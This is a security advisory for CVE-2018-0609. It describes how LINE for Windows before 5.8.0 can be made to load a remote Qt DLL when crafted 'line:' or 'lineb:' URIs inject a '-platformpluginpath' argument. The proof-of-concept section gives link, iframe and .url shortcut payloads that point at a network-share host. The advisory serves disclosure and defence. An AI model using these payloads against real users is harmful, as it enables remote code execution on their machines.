**Vulnerabilities Summary**<br>
LINE for Windows provided by LINE Corporation specifies the path to read DLL when launching software. A user clicking on a specially crafted link, can use this vulnerability to cause the user to insecurely load an arbitrary DLL which can be used to cause arbitrary code execution.

**Vendor Response**<br>
“We released version 5.8.0 of the modified version LINE PC version (Windows version) on May 31, 2018, and we have automatically updated for all users. The update will be applied automatically on the system side when using the product. Also, when installing the LINE PC version (Windows version) from now on please use the latest installer”.

**CVE**<br>
CVE-2018-0609

**Credit**<br>
An independent security researcher has reported this vulnerability to Beyond Security’s SecuriTeam Secure Disclosure program.

**Affected systems**<br>
LINE for Windows before version 5.8.0

**Vulnerability Details**<br>
When processing a ‘line:’ or ‘lineb:’ URI’s it is possible to pass arbitrary command line parameters to LINE.exe, given that the application does not properly parse the mentioned URI ‘scheme:’. In addition, the ‘-platformpluginpath’ parameter supports network share paths. Using this parameter an attacker can cause the application to remotely load a Qt (https://www.qt.io/) DLL library from the network share, found inside the sub-path /imageformats.

**PoC**<br>

```html
<a href='line://?" -platformpluginpath \\192.168.0.1\uncshare "'>contact me</a><br>
<a href='lineb://?" -platformpluginpath \\192.168.0.1\uncshare "'>contact me 2</a>
```

It works with an iframe too.

```html
<iframe src='line://?" -platformpluginpath \\192.168.0.1\uncshare\ "'></iframe>
```

It could be also exploited locally through an .url ‘file:’, for example, creating an internet shortcut file with the next content:

```batch
[InternetShortcut]
URL=line://?" -platformpluginpath \\192.168.0.1\uncshare --
```
